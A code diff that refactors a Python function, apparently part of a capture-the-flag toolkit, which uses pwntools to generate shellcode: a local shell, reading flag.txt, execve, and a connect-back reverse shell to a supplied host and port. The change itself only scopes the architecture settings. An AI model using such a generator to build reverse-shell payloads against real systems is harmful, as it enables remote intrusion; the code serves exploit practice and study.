@@ -276,40 +276,38 @@ def pwn_shellcode_generate(
     """
     import pwn
 
-    pwn.context.arch = arch
-    pwn.context.os = os_name
+    with pwn.context.local(arch=arch, os=os_name):
+        try:
+            if payload == "sh":
+                sc = pwn.shellcraft.sh()
+            elif payload == "cat_flag":
+                sc = pwn.shellcraft.cat("flag.txt")
+            elif payload.startswith("connect_back("):
+                args = payload[len("connect_back(") : -1].split(",")
+                host = args[0].strip().strip("'\"")
+                port = int(args[1].strip())
+                sc = pwn.shellcraft.connect(host, port) + pwn.shellcraft.dupsh()
+            elif payload.startswith("execve("):
+                args = payload[len("execve(") : -1]
+                sc = pwn.shellcraft.execve(args)
+            else:
+                sc = getattr(pwn.shellcraft, payload)()
 
-    try:
-        if payload == "sh":
-            sc = pwn.shellcraft.sh()
-        elif payload == "cat_flag":
-            sc = pwn.shellcraft.cat("flag.txt")
-        elif payload.startswith("connect_back("):
-            args = payload[len("connect_back(") : -1].split(",")
-            host = args[0].strip().strip("'\"")
-            port = int(args[1].strip())
-            sc = pwn.shellcraft.connect(host, port) + pwn.shellcraft.dupsh()
-        elif payload.startswith("execve("):
-            args = payload[len("execve(") : -1]
-            sc = pwn.shellcraft.execve(args)
-        else:
-            sc = getattr(pwn.shellcraft, payload)()
-
-        assembled = pwn.asm(sc)
-        return json.dumps(
-            {
-                "arch": arch,
-                "os": os_name,
-                "payload": payload,
-                "assembly": sc,
-                "shellcode_hex": assembled.hex(),
-                "shellcode_escaped": "".join(f"\\x{b:02x}" for b in assembled),
-                "length": len(assembled),
-            },
-            indent=2,
-        )
-    except Exception as e:
-        return json.dumps({"error": str(e)}, indent=2)
+            assembled = pwn.asm(sc)
+            return json.dumps(
+                {
+                    "arch": arch,
+                    "os": os_name,
+                    "payload": payload,
+                    "assembly": sc,
+                    "shellcode_hex": assembled.hex(),
+                    "shellcode_escaped": "".join(f"\\x{b:02x}" for b in assembled),
+                    "length": len(assembled),
+                },
+                indent=2,
+            )
+        except Exception as e:
+            return json.dumps({"error": str(e)}, indent=2)
 
 
 # ── pwntools_template ───────────────────────────────────────────────────────
